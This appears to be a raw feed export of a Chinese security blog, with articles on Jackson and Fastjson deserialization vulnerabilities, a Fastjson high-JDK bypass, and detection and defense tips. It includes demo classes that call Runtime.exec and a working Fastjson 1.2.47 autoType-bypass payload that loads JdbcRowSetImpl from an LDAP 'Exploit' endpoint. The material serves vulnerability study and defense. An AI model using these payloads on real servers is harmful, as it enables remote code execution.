class="line">vanillaDeserialize:249, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">deserialize:125, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_deserialize:110, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">deserializeTypedFromObject:58, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">deserializeWithType:142, AbstractDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">deserialize:493, SettableBeanProperty (com.fasterxml.jackson.databind.deser)</span><br><span class="line">deserializeAndSet:101, FieldProperty (com.fasterxml.jackson.databind.deser.impl)</span><br><span class="line">vanillaDeserialize:260, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">deserialize:125, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_readMapAndClose:3807, ObjectMapper (com.fasterxml.jackson.databind)</span><br><span class="line">readValue:2797, ObjectMapper (com.fasterxml.jackson.databind)</span><br><span class="line">main:11, JSTest</span><br></pre></td></tr></table></figure><p>调用到MySex类sex属性的setter方法时的函数调用栈：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">setSex:17, MySex (com.mi1k7ea)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">deserializeAndSet:97, MethodProperty (com.fasterxml.jackson.databind.deser.impl)</span><br><span class="line">vanillaDeserialize:260, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">deserialize:125, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_deserialize:110, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">deserializeTypedFromObject:58, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">deserializeWithType:142, AbstractDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">deserialize:493, SettableBeanProperty (com.fasterxml.jackson.databind.deser)</span><br><span class="line">deserializeAndSet:101, FieldProperty (com.fasterxml.jackson.databind.deser.impl)</span><br><span class="line">vanillaDeserialize:260, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">deserialize:125, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_readMapAndClose:3807, ObjectMapper (com.fasterxml.jackson.databind)</span><br><span class="line">readValue:2797, ObjectMapper (com.fasterxml.jackson.databind)</span><br><span class="line">main:11, JSTest</span><br></pre></td></tr></table></figure><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p><strong>在Jackson反序列化中，若调用了enableDefaultTyping()函数或使用@JsonTypeInfo注解指定反序列化得到的类的属性为JsonTypeInfo.Id.CLASS或JsonTypeInfo.Id.MINIMAL_CLASS，则会调用该属性的类的构造函数和setter方法。</strong></p><h2 id="0x05-Jackson反序列化漏洞"><a href="#0x05-Jackson反序列化漏洞" class="headerlink" title="0x05 Jackson反序列化漏洞"></a>0x05 Jackson反序列化漏洞</h2><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><p>满足下面三个条件之一即存在Jackson反序列化漏洞：</p><ul><li>调用了ObjectMapper.enableDefaultTyping()函数；</li><li>对要进行反序列化的类的属性使用了值为JsonTypeInfo.Id.CLASS的@JsonTypeInfo注解；</li><li>对要进行反序列化的类的属性使用了值为JsonTypeInfo.Id.MINIMAL_CLASS的@JsonTypeInfo注解；</li></ul><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>由之前的结论知道，当使用的JacksonPolymorphicDeserialization机制配置有问题时，Jackson反序列化就会调用属性所属类的构造函数和setter方法。</p><p>而如果该构造函数或setter方法存在危险操作，那么就存在Jackson反序列化漏洞。</p><h3 id="漏洞场景及Demo"><a href="#漏洞场景及Demo" class="headerlink" title="漏洞场景及Demo"></a>漏洞场景及Demo</h3><p>这里大致以要进行反序列化的类的属性所属的类的类型分为两种：</p><h4 id="属性不为Object类时"><a href="#属性不为Object类时" class="headerlink" title="属性不为Object类时"></a>属性不为Object类时</h4><p><strong>当要进行反序列化的类的属性所属类的构造函数或setter方法本身存在漏洞时，这种场景存在Jackson反序列化漏洞。当然这种场景开发几乎不会这么写。</strong></p><p>我们看个例子，直接修改MySex类的setSex()方法，在其中添加命令执行操作（除非程序员自己想留后门、不然不会出现这种写法）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MySex</span> <span class="keyword">implements</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sex;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MySex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"MySex构造函数"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"MySex.getSex"</span>);</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"MySex.setSex"</span>);</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Person类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"><span class="comment">//    @JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)</span></span><br><span class="line">    <span class="keyword">public</span> Sex sex;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Person构造函数"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"Person.age=%d, Person.name=%s, %s"</span>, age, name, sex == <span class="keyword">null</span> ? <span class="string">"null"</span> : sex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>JSTest.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JSTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line"></span><br><span class="line">        String json = <span class="string">"&#123;\"age\":6,\"name\":\"mi1k7ea\",\"sex\":[\"com.mi1k7ea.MySex\",&#123;\"sex\":1&#125;]&#125;"</span>;</span><br><span class="line">        Person p2 = mapper.readValue(json, Person.class);</span><br><span class="line">        System.out.println(p2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行即可弹计算器：</p><p><img src="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/22.png" alt=""></p><h4 id="属性为Object类时"><a href="#属性为Object类时" class="headerlink" title="属性为Object类时"></a>属性为Object类时</h4><p><strong>当属性类型为Object时，因为Object类型是任意类型的父类，因此扩大了我们的攻击面，我们只需要寻找出在目标服务端环境中存在的且构造函数或setter方法存在漏洞代码的类即可进行攻击利用。</strong></p><p>后面出现的Jackson反序列化的CVE漏洞、黑名单绕过等都是基于这个原理寻找各种符合条件的利用链而已。</p><p>这里我们假设目标服务端环境中存在其一个恶意类Evil，其setter方法存在任意代码执行漏洞，存在于com.evil包中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.evil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line">    String cmd;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCmd</span><span class="params">(String cmd)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.cmd = cmd;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="keyword">this</span>.cmd);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Person类，将sex属性改为object属性：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"><span class="comment">//    @JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)</span></span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Person构造函数"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"Person.age=%d, Person.name=%s, %s"</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">"null"</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>JSTest.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JSTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line"></span><br><span class="line">        String json = <span class="string">"&#123;\"age\":6,\"name\":\"mi1k7ea\",\"object\":[\"com.evil.Evil\",&#123;\"cmd\":\"calc\"&#125;]&#125;"</span>;</span><br><span class="line">        Person p2 = mapper.readValue(json, Person.class);</span><br><span class="line">        System.out.println(p2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行即可触发：</p><p><img src="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/23.png" alt=""></p><hr><p>OK，Jackson反序列化漏洞相关的一些基本概念都说到了，后面的几篇文章就分别对Jackson反序列化的几个CVE漏洞以及不同的利用链进行分析。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Fastjson系列五——高版本JDK绕过及检测与防御</title>
    <link href="https://www.mi1k7ea.com/2019/11/13/Fastjson%E7%B3%BB%E5%88%97%E4%BA%94%E2%80%94%E2%80%94%E9%AB%98%E7%89%88%E6%9C%ACJDK%E7%BB%95%E8%BF%87%E5%8F%8A%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%98%B2%E5%BE%A1/"/>
    <id>https://www.mi1k7ea.com/2019/11/13/Fastjson系列五——高版本JDK绕过及检测与防御/</id>
    <published>2019-11-13T13:44:51.000Z</published>
    <updated>2019-11-13T14:54:20.056Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-高版本JDK绕过"><a href="#0x01-高版本JDK绕过" class="headerlink" title="0x01 高版本JDK绕过"></a>0x01 高版本JDK绕过</h2><p>由之前利用的PoC知道，利用范围最广的PoC是基于com.sun.rowset.JdbcRowSetImpl的利用链的，而这种利用方式是基于JNDI注入漏洞的，是需要我们有RMI服务或LDAP服务。</p><p>这样就会导致一个限制的问题，即JNDI注入漏洞利用的限制问题——JDK版本。</p><p>由之前的分析知道，JDK对于JNDI注入漏洞在不同版本有着不同的防御措施：</p><ul><li>JDK 6u45、7u21之后：java.rmi.server.useCodebaseOnly的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</li><li>JDK 6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。</li><li>JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。</li></ul><p>因此，相比之下，我们在Fastjson反序列化漏洞的基于com.sun.rowset.JdbcRowSetImpl的利用链上，更倾向于使用LDAP服务来实现攻击利用，因为其对于JDK的适用范围更广。</p><p>但是如果目标环境的JDK版本在6u211、7u201、8u191之后，我们是不是就没有办法绕过了呢？</p><p>当然是有的，KINGX大佬已经写：<a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html" target="_blank" rel="noopener">如何绕过高版本JDK的限制进行JNDI注入利用</a></p><p>主要是有两种方式：</p><ul><li>利用本地Class作为Reference Factory</li><li>利用LDAP返回序列化数据，触发本地Gadget</li></ul><p>这一块有时间我再补充下。。。</p><h2 id="0x02-检测方法"><a href="#0x02-检测方法" class="headerlink" title="0x02 检测方法"></a>0x02 检测方法</h2><p>全局搜索是否使用到了Fastjson，若使用了则进一步排查是否为漏洞版本号即1.2.22-1.2.47，若是则可能存在反序列化漏洞的风险，需进一步排查。</p><p>全局搜索如下关键代码，若存在则进一步排查参数是否外部可控：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line">JSON.parse(</span><br><span class="line">JSON.parseObject(</span><br></pre></td></tr></table></figure><h2 id="0x03-防御方法"><a href="#0x03-防御方法" class="headerlink" title="0x03 防御方法"></a>0x03 防御方法</h2><p>升级到最新版的Fastjson。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Fastjson系列四——1.2.25-1.2.47反序列化漏洞（无需开启AutoType）</title>
    <link href="https://www.mi1k7ea.com/2019/11/11/Fastjson%E7%B3%BB%E5%88%97%E5%9B%9B%E2%80%94%E2%80%941-2-25-1-2-47%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88%E6%97%A0%E9%9C%80%E5%BC%80%E5%90%AFAutoType%EF%BC%89/"/>
    <id>https://www.mi1k7ea.com/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/</id>
    <published>2019-11-11T13:54:53.000Z</published>
    <updated>2019-11-12T16:41:37.217Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h2><p>Fastjson 1.2.x系列的1.2.25-1.2.47版本。</p><h2 id="0x02-限制"><a href="#0x02-限制" class="headerlink" title="0x02 限制"></a>0x02 限制</h2><p>主要是JDK版本对于JDNI注入的限制，基于RMI利用的JDK版本&lt;=6u141、7u131、8u121，基于LDAP利用的JDK版本&lt;=6u211、7u201、8u191。</p><h2 id="0x03-复现利用"><a href="#0x03-复现利用" class="headerlink" title="0x03 复现利用"></a>0x03 复现利用</h2><p>本次Fastjson反序列化漏洞也是基于checkAutoType()函数绕过的，并且无需开启AutoTypeSupport，大大提高了成功利用的概率。</p><p>绕过的大体思路是通过java.lang.Class，将JdbcRowSetImpl类加载到Map中缓存，从而绕过AutoType的检测。因此将payload分两次发送，第一次加载，第二次执行。默认情况下，只要遇到没有加载到缓存的类，checkAutoType()就会抛出异常终止程序。</p><p>Demo如下，无需开启AutoTypeSupport，本地Fastjson用的是1.2.47版本：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JdbcRowSetImplPoc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</span><br><span class="line">        String payload  = <span class="string">"&#123;\"a\":&#123;\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"&#125;,"</span></span><br><span class="line">                + <span class="string">"\"b\":&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\","</span></span><br><span class="line">                + <span class="string">"\"dataSourceName\":\"ldap://localhost:1389/Exploit\",\"autoCommit\":true&#125;&#125;"</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此外，还需要开启RMI服务或LDAP服务以及放置恶意类的Web服务，具体可参考之前的Fastjson系列文章即可。</p><p>运行能成功弹计算器：</p><p><img src="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/1.png" alt=""></p><p>这里，我们看看PoC是怎么写的：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"a"</span>:&#123;</span><br><span class="line">        <span class="attr">"@type"</span>:<span class="string">"java.lang.Class"</span>,</span><br><span class="line">        <span class="attr">"val"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"b"</span>:&#123;</span><br><span class="line">        <span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,</span><br><span class="line">        <span class="attr">"dataSourceName"</span>:<span class="string">"ldap://localhost:1389/Exploit"</span>,</span><br><span class="line">        <span class="attr">"autoCommit"</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到实际上还是利用了com.sun.rowset.JdbcRowSetImpl这条利用链来攻击利用的，因此除了JDK版本外几乎没有限制。</p><p>但是如果目标服务端开启了AutoTypeSupport呢？经测试发现：</p><ul><li>1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport反而不能成功触发；</li><li>1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用；</li></ul><h2 id="0x04-调试分析"><a href="#0x04-调试分析" class="headerlink" title="0x04 调试分析"></a>0x04 调试分析</h2><p>下面我们来调试分析下该PoC为啥会成功。</p><h3 id="不受AutoTypeSupport影响的版本"><a href="#不受AutoTypeSupport影响的版本" class="headerlink" title="不受AutoTypeSupport影响的版本"></a>不受AutoTypeSupport影响的版本</h3><p>不受AutoTypeSupport影响的版本为1.2.33-1.2.47，本次调试的是1.2.47版本。</p><h4 id="未开启AutoTypeSupport时"><a href="#未开启AutoTypeSupport时" class="headerlink" title="未开启AutoTypeSupport时"></a>未开启AutoTypeSupport时</h4><p>在调用DefaultJSONParser.parserObject()函数时，其会对JSON数据进行循环遍历扫描解析。</p><p>在第一次扫描解析中，进行checkAutoType()函数，由于未开启AutoTypeSupport，因此不会进入黑白名单校验的逻辑；由于@type执行java.lang.Class类，该类在接下来的findClass()函数中直接被找到，并在后面的if判断clazz不为空后直接返回：</p><p><img src="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/2.png" alt=""></p><p>往下调试，调用到MiscCodec.deserialze()，其中判断键是否为”val”，是的话再提取val键对应的值赋给objVal变量，而objVal在后面会赋值给strVal变量：</p><p><img src="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/3.png" alt=""></p><p>接着判断clazz是否为Class类，是的话调用TypeUtils.loadClass()加载strVal变量值指向的类：</p><p><img src="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/4.png" alt=""></p><p>在TypeUtils.loadClass()函数中，成功加载com.sun.rowset.JdbcRowSetImpl类后，就会将其缓存在Map中：</p><p><img src="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/5.png" alt=""></p><p>在扫描第二部分的JSON数据时，由于前面第一部分JSON数据中的val键值”com.sun.rowset.JdbcRowSetImpl”已经缓存到Map中了，所以当此时调用TypeUtils.getClassFromMapping()时能够成功从Map中获取到缓存的类，进而在下面的判断clazz是否为空的if语句中直接return返回了，从而成功绕过checkAutoType()检测：</p><p><img src="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/6.png" alt=""></p><h4 id="开启AutoTypeSupport时"><a href="#开启AutoTypeSupport时" class="headerlink" title="开启AutoTypeSupport时"></a>开启AutoTypeSupport时</h4><p>由前面知道，开启AutoTypeSupport后，在checkAutoType()函数中会进入黑白名单校验的代码逻辑。</p><p>在第一部分JSON数据的扫描解析中，由于@type指向java.lang.Class，因此即使是开启AutoTypeSupport先后进行白名单、黑名单校验的情况下都能成功通过检测，之后和前面的一样调用findClass()函数获取到Class类：</p><p><img src="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/7.png" alt=""></p><p>关键在于第二部分JSON数据的扫描解析。第二部分的@type指向的是利用类”com.sun.rowset.JdbcRowSetImpl”，其中的”com.sun.”是在denyList黑名单中的，但是为何在检测时能成功绕过呢？</p><p>我们调试发现，逻辑是先进行白名单再进行黑名单校验，在黑名单校验的if判断条件中是存在两个必须同时满足的条件的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="keyword">null</span>) &#123;</span><br></pre></td></tr></table></figure><p>第一个判断条件<code>Arrays.binarySearch(denyHashCodes, hash) &gt;= 0</code>是满足的，因为我们的@type包含了黑名单的内容；关键在于第二个判断条件<code>TypeUtils.getClassFromMapping(typeName) == null</code>，这里由于前面已经将com.sun.rowset.JdbcRowSetImpl类缓存在Map中了，也就是说该条件并不满足，导致能够成功绕过黑名单校验、成功触发漏洞。</p><h3 id="受AutoTypeSupport影响的版本"><a href="#受AutoTypeSupport影响的版本" class="headerlink" title="受AutoTypeSupport影响的版本"></a>受AutoTypeSupport影响的版本</h3><p>受AutoTypeSupport影响的版本为1.2.25-1.2.32，本次调试的是1.2.25版本。</p><h4 id="开启AutoTypeSupport时-1"><a href="#开启AutoTypeSupport时-1" class="headerlink" title="开启AutoTypeSupport时"></a>开启AutoTypeSupport时</h4><p>我们在开启AutoTypeSupport之后，会利用失败，报如下错：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; com.alibaba.fastjson.JSONException: autoType is not support. com.sun.rowset.JdbcRowSetImpl</span><br></pre></td></tr></table></figure><p>调试发现，在第一部分JSON数据的解析中，checkAutoType()函数的处理过程和前面是差不多的。能够成功通过该函数的检测，因此问题不在这，继续往下调试。</p><p>在第二部分JSON数据的解析中，@type指向的”com.sun.rowset.JdbcRowSetImpl”在checkAutoType()函数中会被dentList黑名单中的”com.sun.”匹配到，因此会直接报错显示不支持：</p><p><img src="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/8.png" alt=""></p><p>可以明显看到，第一个if语句是白名单过滤，第二个if语句是黑名单过滤，其中黑名单过滤的if语句中的判断条件和前面的不受影响的版本的不一样，对比下是少了个判断条件，即<code>TypeUtils.getClassFromMapping(typeName) == null</code>。</p><h4 id="未开启AutoTypeSupport时-1"><a href="#未开启AutoTypeSupport时-1" class="headerlink" title="未开启AutoTypeSupport时"></a>未开启AutoTypeSupport时</h4><p>当不开启AutoTypeSupport时就不会进入该黑白名单校验的代码逻辑中，就不会被过滤报错。</p><p>这里，我们换个不受AutoTypeSupport影响的且未使用哈希黑名单的版本来方便我们进行对比查看，这里选了1.2.33，看下checkAutoType()中对应的代码：</p><p><img src="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/9.png" alt=""></p><p>对比黑名单校验的if判断语句条件就知道了，为什么后面的版本不受影响，那是因为通过<code>&amp;&amp;</code>多添加了一个判断条件<code>TypeUtils.getClassFromMapping(typeName) 